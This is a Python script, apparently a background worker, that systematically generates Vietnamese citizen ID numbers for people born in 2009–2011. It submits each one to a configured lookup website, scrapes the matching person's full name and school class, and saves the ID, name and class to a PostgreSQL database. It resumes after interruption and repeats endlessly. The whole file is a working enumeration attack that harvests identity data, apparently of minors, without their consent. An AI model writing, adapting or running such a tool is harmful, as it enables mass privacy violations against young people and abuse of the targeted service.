import os
import time
import requests
from bs4 import BeautifulSoup
import psycopg2
from dotenv import load_dotenv

load_dotenv()

DATABASE_URL = os.getenv("DATABASE_URL")
TARGET_URL_SITE = os.getenv("TARGET_URL_SITE")

PROVINCES = [
    "001", "002", "003", "004", "005", "006", "007", "008", "009", "010",
    "011", "012", "013", "014", "015", "016", "017", "018", "019", "020",
    "021", "022", "023", "024", "025", "026", "027", "028", "030", "031",
    "032", "033", "034", "035", "036", "037", "038", "040", "042", "044",
    "045", "046", "048", "049", "051", "052", "054", "056", "058", "060",
    "062", "064", "066", "068", "070", "072", "074", "075", "077", "079",
    "080", "082", "083", "084", "086", "087", "089", "091", "092", "093",
    "094", "095", "096"
]

TARGET_PROVINCES = PROVINCES   
YEARS = ["09", "10", "11"]     
GENDERS = ["2", "3"]          

HARDCODE_MAX_LIMIT = 80000    
REQUEST_DELAY = 0.3           

def get_db_connection():
    if not DATABASE_URL:
        return None
    try:
        return psycopg2.connect(DATABASE_URL)
    except:
        return None

def init_db():
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS scanned_records (
                id SERIAL PRIMARY KEY,
                full_name TEXT NOT NULL,
                class_name TEXT,
                cccd VARCHAR(12) UNIQUE NOT NULL,
                scanned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS scan_progress (
                id INT PRIMARY KEY,
                province VARCHAR(3) NOT NULL,
                year VARCHAR(2) NOT NULL,
                gender VARCHAR(1) NOT NULL,
                current_seq INT NOT NULL,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        cur.execute("SELECT COUNT(*) FROM scan_progress WHERE id = 1;")
        if cur.fetchone()[0] == 0:
            cur.execute(
                "INSERT INTO scan_progress (id, province, year, gender, current_seq) VALUES (1, %s, %s, %s, %s);",
                (TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0)
            )
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print(f"[!] Worker Init DB Error: {e}")

def get_db_progress():
    conn = get_db_connection()
    if not conn:
        return TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0
    try:
        cur = conn.cursor()
        cur.execute("SELECT province, year, gender, current_seq FROM scan_progress WHERE id = 1;")
        row = cur.fetchone()
        cur.close()
        conn.close()
        if row:
            return row[0], row[1], row[2], row[3]
    except:
        pass
    return TARGET_PROVINCES[0], YEARS[0], GENDERS[0], 0

def save_db_progress(prov, year, gender, seq):
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute(
            "UPDATE scan_progress SET province = %s, year = %s, gender = %s, current_seq = %s, updated_at = CURRENT_TIMESTAMP WHERE id = 1;",
            (prov, year, gender, seq)
        )
        conn.commit()
        cur.close()
        conn.close()
    except:
        pass

def save_to_neon(full_name, class_name, cccd):
    conn = get_db_connection()
    if not conn:
        return
    try:
        cur = conn.cursor()
        cur.execute(
            "INSERT INTO scanned_records (full_name, class_name, cccd) VALUES (%s, %s, %s) ON CONFLICT (cccd) DO NOTHING;",
            (full_name, class_name, cccd)
        )
        conn.commit()
        cur.close()
        conn.close()
    except:
        pass

def main():
    print("[i] Background Scanner Worker đang khởi động...")
    init_db()
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) StandaloneWorker"}

    while True:
        try:
            cur_prov, cur_year, cur_gender, cur_seq = get_db_progress()
            print(f"[i] Tiếp tục quét - Tỉnh: {cur_prov} | Năm: {cur_year} | Giới tính: {cur_gender} | Seq: {cur_seq}")

            prov_idx = TARGET_PROVINCES.index(cur_prov) if cur_prov in TARGET_PROVINCES else 0

            for p_i in range(prov_idx, len(TARGET_PROVINCES)):
                prov = TARGET_PROVINCES[p_i]
                start_y_idx = YEARS.index(cur_year) if (prov == cur_prov and cur_year in YEARS) else 0
                
                for y_i in range(start_y_idx, len(YEARS)):
                    year = YEARS[y_i]
                    start_g_idx = GENDERS.index(cur_gender) if (prov == cur_prov and year == cur_year and cur_gender in GENDERS) else 0
                    
                    for g_i in range(start_g_idx, len(GENDERS)):
                        gender = GENDERS[g_i]
                        
                        if prov == cur_prov and year == cur_year and gender == cur_gender:
                            seq_start = cur_seq
                            cur_prov, cur_year, cur_gender = "", "", "" 
                        else:
                            seq_start = 0

                        for seq in range(seq_start, HARDCODE_MAX_LIMIT + 1):
                            cccd = f"{prov}{gender}{year}{seq:06d}"
                            save_db_progress(prov, year, gender, seq)
                            
                            url = TARGET_URL_SITE.format(cccd=cccd)
                            try:
                                response = requests.get(url, headers=headers, timeout=10)
                                if response.status_code == 200:
                                    soup = BeautifulSoup(response.text, 'html.parser')
                                    table = soup.find('table', class_='qitc-bang')
                                    if table:
                                        rows = table.find_all('tr')
                                        for row in rows:
                                            cols = row.find_all('td')
                                            if len(cols) >= 4:
                                                full_name = cols[2].get_text(strip=True)
                                                class_name = cols[3].get_text(strip=True)
                                                save_to_neon(full_name, class_name, cccd)
                                                print(f"[+] Trúng! CCCD: {cccd} - {full_name} | {class_name}")
                                                break
                            except:
                                time.sleep(1)
                            
                            time.sleep(REQUEST_DELAY)

            print("[i] Quét xong toàn bộ vòng, nghỉ 60s rồi quét lại từ đầu...")
            time.sleep(60)

        except Exception as e:
            print(f"[!] Lỗi worker: {e}. Thử lại sau 5s...")
            time.sleep(5)

if __name__ == "__main__":
    main()
